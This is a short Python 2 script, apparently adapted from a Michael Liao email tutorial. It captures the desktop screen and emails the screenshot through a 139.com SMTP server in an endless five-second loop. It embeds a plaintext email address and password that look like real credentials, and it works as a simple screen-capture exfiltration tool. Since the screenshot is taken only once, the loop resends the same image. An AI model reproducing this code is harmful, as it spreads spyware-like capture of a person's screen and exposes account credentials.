# -*- coding: utf-8 -*-

#源码 https://github.com/michaelliao/learn-python/blob/master/email/sendmail_multipart.py
#感谢 Michael Liao

from email import encoders
from email.header import Header
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.utils import parseaddr, formataddr
from PIL import Image,ImageGrab
import os
import time

import smtplib

def _format_addr(s):
    name, addr = parseaddr(s)
    return formataddr(( \
        Header(name, 'utf-8').encode(), \
        addr.encode('utf-8') if isinstance(addr, unicode) else addr))

from_addr = "13564945645@139.com"
password = "13564945645syy"
to_addr = "13564945645@139.com"
smtp_server = "smtp.139.com"

msg = MIMEMultipart()
msg['From'] = _format_addr(u'桌面截图 <%s>' % from_addr)
msg['To'] = _format_addr(u'管理员 <%s>' % to_addr)
msg['Subject'] = Header(u'来自SMTP的问候……', 'utf-8').encode()

# add MIMEText:
msg.attach(MIMEText('send with file...', 'plain', 'utf-8'))


#截图
im = ImageGrab.grab() 
im.save(os.getcwd()+"\\screenshot.png")#保存图片 

# add file:
with open('screenshot.png', 'rb') as f:
    mime = MIMEBase('image', 'png', filename='screenshot.png')
    mime.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
    mime.add_header('Content-ID', '<0>')
    mime.add_header('X-Attachment-Id', '0')
    mime.set_payload(f.read())
    encoders.encode_base64(mime)
    msg.attach(mime)

while True:
	
	server = smtplib.SMTP(smtp_server, 25)
	server.set_debuglevel(1)
	server.login(from_addr, password)
	server.sendmail(from_addr, [to_addr], msg.as_string())
	server.quit()
	time.sleep(5)